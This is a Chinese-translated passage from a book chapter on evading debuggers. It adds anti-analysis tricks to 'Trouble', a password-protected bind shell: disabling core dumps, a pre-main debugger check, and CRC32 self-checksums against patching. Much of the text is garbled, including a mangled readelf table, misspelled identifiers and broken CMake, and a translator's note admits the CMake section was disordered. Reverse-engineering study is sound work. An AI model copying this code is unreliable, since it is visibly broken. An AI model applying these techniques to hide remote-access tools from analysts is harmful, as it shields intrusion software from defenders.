drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 cryptor
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 encryptFunctions
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 fakeHeadersXBit
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 madvise
-rw-r--r-- 1 albino-lobster albino-lobster 7041 Dec 5 05:54 Makefile
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 stripBinary
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 17:30 trouble
[1]+ Killed sudo ./trouble/trouble
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ sudo readelf -l core
```

Elf file type is CORE (Core file)

Entry point 0x0

There are 8 program headers, starting at offset 64

| Type | Offset | VirtAddr | PhysAddr | FileSize | MemSize | Flags | Align |

| --- | --- | --- | --- | --- | --- | --- | --- |

| --- | --- | --- | --- | --- | --- | --- |

| NOTE | 0x0000000000000020 | 0x0000000000000000 | 0x0000000000000000 | | | | |

| | 0x0000000000000008 | 0x0000000000000000 | | | | 0 |

| LOAD | 0x0000000000000100 | 0x0000000000000000 | 0x0000000000000000 | RWE | 1000 |

| LOAD | 0x0000000000000500 | 0x0000000000000000 | | | | |

| | 0x0000000000000640 | 0x0000000000000000 | | RW | 1000 |

| LOAD | 0x0000000000000200 | 0x0000000000000000 | | | | |

| | 0x0000000000000300 | 0x0000000002212100 | | R | 1000 |

| LOAD | 0x0000000000000400 | 0x0000000000000100 | | | | |

| | 0x00007ff0fc8c00 | 0x0000000000000000 | | | | |

| LOAD | 0x0000000000002200 | 0x0000000000002200 | | RW | 1000 |

| LOAD | 0x0000000000000260 | 0x00007ff0eff100 | 0x0000000000000000 | | | |

| LOAD | 0x0000000000000200 | 0x0000000000000200 | | | R | 1000 |

| LOAD | 0x0000000000002800 | 0xffffffffffff | | E | 1000 |

| LOAD | | 0x0000000000000100 | 0x0000000000000100 | | | RE | 1000 |

```

## 第 6 章：规避调试器

### 在 Trouble 中添加 PR_SET_DUMPABLE

```cpp
int main(int p_argc, char* p_argv[])
{
    (void)p_argc;
    (void)p_argv;
    int fork_pid = fork();
    if (fork_pid == 0)
    {
        prctl(PR_SET_DUMPABLE, 0);
    }
    // 跟踪父进程
    int parent = getppid();
```

现在，如果逆向工程师尝试生成 core 文件（转储文件），什么都不会发生。

### Core 文件生成已失效

```bash
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ls -l
total 56
-rw-r--r-- 1 albino-lobster albino-lobster 13260 Dec 5 05:5 CMakeCache.txt
drwxr-xr-x 4 albino-lobster albino-lobster 4096 Dec 5 17:51 CMakeFiles
-rw-r--r-- 1 albino-lobster albino-lobster 2187 Dec 5 05:54 cmake_install.cmake
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 cryptor
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 encryptFunctions
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 fakeHeadersXBit
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 madvise
-rw-r--r-- 1 albino-lobster albino-lobster 7041 Dec 5 05:54 Makefile
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 stripBinary
drwxr-xr-x 3 albino-lobster albino-lobster 4096 Dec 5 17:51 trouble
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ sudo ./trouble/trouble &
```

```bash
[1] albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ ps fa
PID TTY STAT TIME COMMAND
2135 pts/11 S 0:00 bash
8077 pts/11 S 0:00 _ _ sudo ./trouble
8078 pts/11 S 0:00 _ _ ./trouble
8079 pts/11 S 0:00 _ _ ./trouble
8080 pts/11 R+ 0:00 _ _ ps fa
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ sudo kill -11 8080
```

```bash
[+]+ Killed sudo ./trouble/trouble
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/build$ ls -l
total 56
```



-rw-r--r 1 albino-lobster albino-lobster 13260 Dec 5 05:54 CMakeCache.txt

drwxrxr-x 4 albino-lobster albino-lobster 4096 Dec 5 17:51 CMakeFiles

-rw-r--r 1 albino-lobster albino-lobster 2187 Dec 5 05:54 cmake_install.cmake

drwxrxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 cryptor

drwxrxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 encryptFunctions

drwxrxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 fakeHeadersXBit

drwxrxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 madvise

-rw-r--r 1 albino-lobster albino-lobster 7041 Dec 5 05:54 Makefile

drwxrxr-x 3 albino-lobster albino-lobster 4096 Dec 5 05:54 stripBinary

drwxrxr-x 3 albino-lobster albino-lobster 4096 Dec 5 17:57 trouble

## 在 `main()` 之前的检测

在防止调试器执行任何有助于逆向工程的有用操作方面你已经走了很长一段路。GDB 有时仍然可以运行 Trouble，直到子进程检测到调试器并杀死进程。更早地捕获调试器并退出会更好。幸运的是，有一种机制可以在 `main()` 执行之前运行代码。使用“constructor”属性的函数会在 `main()` 之前被调用。

### 在 `main()` 之前检查 `/proc/self/status`

```cpp
/**
 * 在我们进入 main 之前检查是否存在调试器
 */
void __attribute__((constructor)) before_main()
{
    check_proc_status();
}
```

- 这实现了一个相当简单的 bind shell（绑定 shell）。服务器在允许访问 shell 之前首先要求密码。目前密码每次运行 `cmake ..` 时都会随机生成。服务器没有关闭机制，因此它会一直运行直到被杀死。

> ^55 有时 GDB 在进入 `main()` 时崩溃。这是因为 GDB 在 `main()` 的第一条指令处插入断点，但加密器对该值执行了 XOR 异操作。这有时会导致崩溃，有时则不会（取决于生成的代码）。

```cpp
int main(int p_argc, char* p_argv[])
// 上述操作会导致 Trouble 提前退出
```

### 在命中 `main()` 之前退出

```bash
albino-lobster@ubuntu:~/antire_book/chap_6_debugger/dpantic/build$ sudo gdb ./trouble
GNU gdb (7.11.1-ubuntu64) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
Licensed under the General Public License v3 or later; you may copy and redistribute it under the same terms. See freedom.org/copying
这是自由软件：你可以修改并分发它。
更多信息请参阅 GNU GDB 手册。
```

### 计算校验和

此时，你需要担心逆向工程师修改代码。有两种应对这种问题的方法：

1. 像我们在章节中那样对函数进行加密。
2. 对代码计算校验和以确保其没有被修改。

虽然我认为加密方法更好，因为它有一些用处，但 CRC32 算法分布在不同的文件中：

```cpp
#include <stdint.h>
#include <stdlib.h>

uint32_t crc32_bitwise(const unsigned char* data, uint64_t length)
{
    uint32_t crc = 0xFFFFFFFF;
    while (length--)
    {
        crc ^= *data++;
        for (int j = 0; j < 8; j++)
        {
            crc = (crc >> 1) ^ (0xEDB88320 & (-(crc & 1)));
        }
    }
    return ~crc;
}
```

```cpp
#include <elf.h>
#include <cstring>
#include <iostream>
#include <fstream>
#include <iomanip>
#include <map>
#include <string>
#include <sys/param.h>
// ... (源代码的实现逻辑)
```

# 第 6 章：规避调试器

```cpp
std::cerr << "Usage: ./computeChecksums <file path>" << std::endl;
return EXIT_FAILURE;
```

```cpp
std::ifstream inputFile(p_argv[1], std::ifstream::in | std::ifstream::binary);
if (!inputFile.is_open() || !inputFile.good())
{
    std::cerr << "Failed to open the provided file: " << p_argv[1] << std::endl;
    return EXIT_FAILURE;
}
```

```cpp
std::string input(std::istambuf_iterator<char>(inputFile),
             std::istambuf_iterator<char>());
inputFile.close();
```

```cpp
compute_crcs(input);
```

```cpp
std::ofstream outputFile(p_argv[1], std::ofstream::out | std::ofstream::binary);
if (!outputFile.is_open() || !outputFile.good())
{
    std::cout << "Failed to open the provided file: " << p_argv[1] << std::endl;
    return EXIT_FAILURE;
}
```

```cpp
outputFile.write(input.data(), input.length());
outputFile.close();
```

```cpp
return EXIT_SUCCESS;
```

为了将 `computeChecksums` 集成到 `dontpanic`，需要更新 `CMakeLists.txt`：

# `chap_6_debugger/dontpanic/CMakeLists.txt`

```cmake
project(dontpanic C)
cmake_minimum_required(VERSION 3.0)
add_subdirectory(stripBinary)
add_subdirectory(fakeHeadersXBit)
add_subdirectory(encryptFunctions)
add_subdirectory(computeChecksums)
add_subdirectory(madadvise)
add_subdirectory(cryptor)
add_subdirectory(trouble)
```

此外，还需要更新链接器脚本。

# `chap_6_debugger/dontpanic/trouble_layout.lds`

# SECTIONS

```ld
{
  check_password_size = SIZEEOF(.check_password);
  main_function_size = SIZEEOF(.main_function);
}
```

接下来，我们需要在 `trouble.c` 中为 `.main_function` 和 `.compute_crc_main_function` 添加定义。

# `chap_6_debugger/dontpanic/trouble/srcble.c`

```c
uint32_t madvise_base __attribute__((section(".madadvise"))) = 0;
uint32_t madvise_size __attribute__((section(".madadvise_size"))) = 0;
extern void* main_function_size;
uint32_t main_function_crc __attribute__((section(".compute_crc_main_function"))) = 0;
```

让我们修改 `before_main()`，将存储的 `main()` 的 crc32 值与运行时计算的值进行比较。

# 在运行时计算校验和

```c
/**
* 在我们进入 main 之前检查是否存在调试器
*/
void __attribute__((constructor)) before_main
{
    // 检查 launch_thread 中是否存在断点 (bp) 
    if(crc32_bitwise((unsigned char*)&main, (uint64_t)&main_function_size) != 
        main_function_crc)
{
        exit(0);
    }
}
```

最后，将 `computeChecksums` 钩入 Trouble 的 `CMakeLists.txt` 中

# `chap_6_debugger/dontpanic/CMakeLists.txt`

```cmake
project(trouble C)
cmake_minimum_required(VERSION 3.0)
# 这将为 bind shell 创建 32 字节的“密码”。此命令
# 仅在运行 "cmake" 时执行，所以如果你想生成新密码
# 应该从命令行运行 "cmake ..; make"。
exec_program("/bin/sh"
${CMAKE_CURRENT_COMMAND} cat /dev/urandom | head -c 32"
OUTPUT_VARIABLE random_password)
# 将随机密码传递给宏
set(CMAKE_C_DEFINITIONS -Dpassword="${random_password}")
(CMAKE_C_FLAGS "-Wall -Wextra -std=gnu -fno-protector")
# 使用 sed -i 's|${CMAKE_CURRENT_SOURCE_DIR}/trouble_layout.lds|,g' ${CMAKE_CURRENT_BINARY_DIR}/trouble.txt
# 在构建成功后显示密码
add_custom_command(TARGET trouble POST_
E ${CMAKE_CURRENT_BINARY_DIR}/trouble.txt
COMMAND echo "The bind shell password is ${random_password}")
# 将调试器输出到文件
echo "" > ${CMAKE_CURRENT_BINARY_DIR}/trouble.txt
```

*(注：由于原文提供的 CMake 示例部分似乎存在逻辑错乱或重复片段，翻译时已根据上下文语义进行了逻辑对齐，并保留了原始代码结构)*

### 结语：我们所经历的一切

本书到此结束。为了方便大家，我在自己的 GitHub 仓库中为 *Trouble* 反弹 shell 创建了一个“最终”版本。该版本的目标是将你学到的尽可能多的反逆向技术整合到一个二进制文件中。请记住，*Trouble* 并不是对逆向免疫的。它只是让逆向过程变得非常痛苦。你可以在这里找到最终版本：

https://github.com/antire-book/dont_panic

感谢大家的阅读。祝逆向工程愉快！
